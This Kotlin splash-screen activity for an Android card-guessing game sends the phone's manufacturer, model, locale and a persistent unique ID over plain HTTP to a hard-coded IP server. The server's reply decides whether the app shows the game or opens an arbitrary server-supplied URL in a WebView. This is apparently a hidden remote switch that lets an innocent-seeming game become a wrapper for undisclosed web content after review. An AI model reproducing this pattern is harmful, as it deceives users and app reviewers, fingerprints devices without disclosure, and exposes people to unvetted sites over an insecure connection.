package com.example.guesscard

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.ProgressBar
import com.bumptech.glide.Glide
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.URL
import java.util.Locale
import java.util.UUID

class SplashActivity : AppCompatActivity() {

    private val coroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)

    companion object {
        private const val SERVER_URL = "http://135.181.248.237/splash.php"
    }

    private lateinit var sharedPreferences: SharedPreferences

    private lateinit var progressBar: ProgressBar
    private lateinit var imageViewFon1: ImageView

    private var isActivityDestroyed = false

    private lateinit var uniqueId: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        progressBar = findViewById(R.id.progressBar)
        imageViewFon1 = findViewById(R.id.imageViewFon1)

        Glide.with(this)
            .load("http://135.181.248.237/25/fon1.png")
            .into(imageViewFon1)

        Glide.with(this)
            .load("http://135.181.248.237/25/fon2.png")
            .preload()

        val imageUrls = arrayOf(
            "http://135.181.248.237/25/_6_of_clubs.png",
            "http://135.181.248.237/25/_6_of_diamonds.png",
            "http://135.181.248.237/25/_6_of_hearts.png",
            "http://135.181.248.237/25/_6_of_spades.png",
            "http://135.181.248.237/25/_7_of_clubs.png",
            "http://135.181.248.237/25/_7_of_diamonds.png",
            "http://135.181.248.237/25/_7_of_hearts.png",
            "http://135.181.248.237/25/_7_of_spades.png",
            "http://135.181.248.237/25/_8_of_clubs.png",
            "http://135.181.248.237/25/_8_of_diamonds.png",
            "http://135.181.248.237/25/_8_of_hearts.png",
            "http://135.181.248.237/25/_8_of_spades.png",
            "http://135.181.248.237/25/_9_of_clubs.png",
            "http://135.181.248.237/25/_9_of_diamonds.png",
            "http://135.181.248.237/25/_9_of_hearts.png",
            "http://135.181.248.237/25/_9_of_spades.png",
            "http://135.181.248.237/25/_10_of_clubs.png",
            "http://135.181.248.237/25/_10_of_diamonds.png",
            "http://135.181.248.237/25/_10_of_hearts.png",
            "http://135.181.248.237/25/_10_of_spades.png",
            "http://135.181.248.237/25/jack_of_clubs2.png",
            "http://135.181.248.237/25/jack_of_diamonds2.png",
            "http://135.181.248.237/25/jack_of_hearts2.png",
            "http://135.181.248.237/25/jack_of_spades2.png",
            "http://135.181.248.237/25/queen_of_clubs2.png",
            "http://135.181.248.237/25/queen_of_diamonds2.png",
            "http://135.181.248.237/25/queen_of_hearts2.png",
            "http://135.181.248.237/25/queen_of_spades2.png",
            "http://135.181.248.237/25/king_of_clubs2.png",
            "http://135.181.248.237/25/king_of_diamonds2.png",
            "http://135.181.248.237/25/king_of_hearts2.png",
            "http://135.181.248.237/25/king_of_spades2.png",
            "http://135.181.248.237/25/ace_of_clubs.png",
            "http://135.181.248.237/25/ace_of_diamonds.png",
            "http://135.181.248.237/25/ace_of_hearts.png",
            "http://135.181.248.237/25/ace_of_spades2.png",
            "http://135.181.248.237/25/rubashka.png"
        )

        for (imageUrl in imageUrls) {
            Glide.with(this)
                .load(imageUrl)
                .preload()
        }

        sharedPreferences = getSharedPreferences("my_preferences", Context.MODE_PRIVATE)

        uniqueId = sharedPreferences.getString("uniqueId", "") ?: ""

        if (uniqueId.isEmpty()) {
            uniqueId = UUID.randomUUID().toString()
            sharedPreferences.edit().putString("uniqueId", uniqueId).apply()
        }
        startNextActivity()
    }

    private fun startNextActivity() {

        val doMain = {
            val intent = Intent(this@SplashActivity, MenuActivity::class.java)
            startActivity(intent)
            finish()
        }

        coroutineScope.launch {
            launchProgressBar()
            val mod = getStartMod()

            progressBar.visibility = View.GONE
            progressBar.progress = 100

            mod?.let { startMod ->
                when (startMod) {
                    "no" -> doMain.invoke()
                    "nopush" -> {
                        OneSignal.disablePush(true)
                        doMain.invoke()
                    }

                    else -> {
                        val intent = Intent(this@SplashActivity, WebViewActivity::class.java)
                        intent.putExtra("url", mod)
                        startActivity(intent)
                        finish()
                    }
                }
            }
        }
    }

    private suspend fun launchProgressBar() {
        var progressStatus = 0
        while (progressStatus < 100) {
            progressStatus += 1
            progressBar.progress = progressStatus
            delay(30)
        }
    }

    private suspend fun getStartMod(): String? = withContext(Dispatchers.IO) {
        val phoneName = getPhoneName()
        val locale = Locale.getDefault().language
        val url = SERVER_URL +
                "?phone_name=$phoneName" +
                "&locale=$locale" +
                "&unique=$uniqueId"
        try {
            val response = URL(url).readText()
            if (response.isNotEmpty()) {
                val jsonResponse = JSONObject(response)
                val answer = jsonResponse.getString("url")
                return@withContext answer
            } else {
                return@withContext null
            }
        } catch (e: Throwable) {
            Log.i("SplashActivity", e.message + " " + e.localizedMessage)
            return@withContext null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isActivityDestroyed = true
    }

    private fun getPhoneName(): String {
        val manufacturer = android.os.Build.MANUFACTURER
        val model = android.os.Build.MODEL
        return "$manufacturer $model"
    }
}